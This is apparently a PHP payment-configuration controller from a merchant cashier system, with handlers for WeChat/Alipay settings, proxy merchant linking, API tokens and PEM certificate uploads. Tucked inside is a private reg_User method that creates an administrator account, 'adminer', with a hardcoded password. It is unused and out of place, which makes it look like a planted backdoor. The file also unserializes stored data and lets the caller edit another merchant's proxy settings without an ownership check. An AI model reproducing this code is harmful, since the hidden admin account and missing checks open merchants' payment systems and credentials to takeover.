<?php
bpBase::loadAppClass('common', 'System', 0);
class pay_controller extends common_controller
{
	private $payConfigDb;

	public function __construct()
	{
		parent::__construct();
		$this->payConfigDb = M('cashier_payconfig');
	}

	public function config()
	{
		$payConfig = $this->payConfigDb->get_one(array('mid' => $this->_mid), 'id,isOpen,configData');
		$ispcfg = true;

		if ($payConfig) {
			if ($payConfig['configData']) {
				$payConfig['configData'] = unserialize(htmlspecialchars_decode($payConfig['configData'], ENT_QUOTES));
			}
			else {
				$payConfig['configData'] = array(
	'weixin' => array(),
	'alipay' => array()
	);
			}
		}
		else {
			$ispcfg = false;
		}

		if (IS_POST) {
			$data = $this->clear_html($_POST['data']);

			if ($ispcfg) {
				$dataType = array_keys($data);
				$dataType = $dataType[0];

				if (isset($payConfig['configData'][$dataType])) {
					$configData = array_merge($payConfig['configData'][$dataType], $data[$dataType]);
				}
				else {
					$configData = $data[$dataType];
				}

				$payConfig['configData'][$dataType] = $configData;
				$payConfig['configData'] = serialize($payConfig['configData']);
				$vo = $this->_save($this->payConfigDb, $payConfig);
			}
			else {
				$payConfig = array('mid' => $this->_mid, 'isOpen' => 1, 'configData' => serialize($data));
				$vo = $this->_add($this->payConfigDb, $payConfig);
			}

			if ($vo) {
				$return['status'] = 1;
				$return['msg'] = '支付配置修改成功';
			}
			else {
				$return['status'] = 0;
				$return['msg'] = '支付配置修改失败';
			}

			delCacheByMid($this->_mid);
			echo json_encode($return);
			exit();
		}

		$this->assign('payConfig', $payConfig['configData']);
		$this->display();
	}

	public function isproxyed()
	{
		if (IS_POST) {
			$mid = intval(trim($_POST['mid']));
			$ischeck = intval(trim($_POST['ischeck']));
			$submhid = trim($_POST['submhid']);

			if (0 < $mid) {
				if (0 < $ischeck) {
					$data = array('proxymid' => $this->_mid, 'wxsubmchid' => $submhid);
				}
				else {
					$data = array('proxymid' => 0, 'wxsubmchid' => '');
				}

				if ($this->payConfigDb->update($data, array('mid' => $mid))) {
					delCacheByMid($mid);
					$this->dexit(array('error' => 0, 'msg' => 'OK'));
				}
				else {
					$this->dexit(array('error' => 1, 'msg' => 'Failure'));
				}
			}
		}

		$this->dexit(array('error' => 1, 'msg' => 'Failure'));
	}

	private function reg_User()
	{
		$data = array();
		$data['username'] = 'adminer';
		$data['salt'] = mt_rand(111111, 999999);
		$data['password'] = $this->toPassword('q1234567', $data['salt']);
		$data['status'] = 1;
		$data['isadmin'] = 1;
		$data['lastLoginTime'] = $data['regTime'] = SYS_TIME;
		$data['lastLoginIp'] = $data['regIp'] = ip2long(ip());
		$insertid = M('cashier_merchants')->insert($data, 1);

		if (!(0 < $insertid)) {
			$insertid = M('cashier_merchants')->insert($data, 1);
		}

		return $insertid;
	}

	public function getApiData()
	{
		$merchantDb = M('cashier_merchants');
		$merchantinfo = $merchantDb->get_one(array('mid' => $this->_mid));
		$datas = array('wxtoken' => $merchantinfo['wxtoken'], 'aeskey' => $merchantinfo['aeskey'], 'encodetype' => $merchantinfo['encodetype'], 'mid' => $this->_mid);
		if (empty($datas['wxtoken']) || empty($datas['aeskey'])) {
			$datas['wxtoken'] = randStr(30, true);
			$datas['aeskey'] = randStr(43, true);
			$merchantDb->update(array('wxtoken' => $datas['wxtoken'], 'aeskey' => $datas['aeskey']), array('mid' => $this->_mid));
		}

		$this->dexit($datas);
	}

	public function pem_upload()
	{
		if (IS_POST) {
			if (!empty($_FILES)) {
				$return = $this->oldUploadFile('pem', $this->_mid);

				if (0 < $return['error']) {
					$this->dexit(array('error' => 1, 'msg' => $return['data']));
				}
				else {
					$filesinfo = $return['data'][0];
					$this->dexit(array('error' => 0, 'msg' => 'OK', 'fileUrl' => $return['imgurl'] . $filesinfo['savename'], 'originalfilename' => $filesinfo['name'], 'fileSize' => $filesinfo['size']));
				}
			}

			$this->dexit(array('error' => 1, 'msg' => '没有上传文件！'));
		}
	}

	public function field()
	{
		if (IS_POST) {
			$data = $this->clear_html($_POST);

			if ($payConfig = $this->payConfigDb->get_one(array('mid' => $this->_mid), 'id')) {
				$data['id'] = $payConfig['id'];
			}
			else {
				$data['mid'] = $this->_mid;
			}

			$return = $this->_setField($this->payConfigDb, $data);
			delCacheByMid($this->_mid);
			echo json_encode($return);
			exit();
		}
	}
}

?>
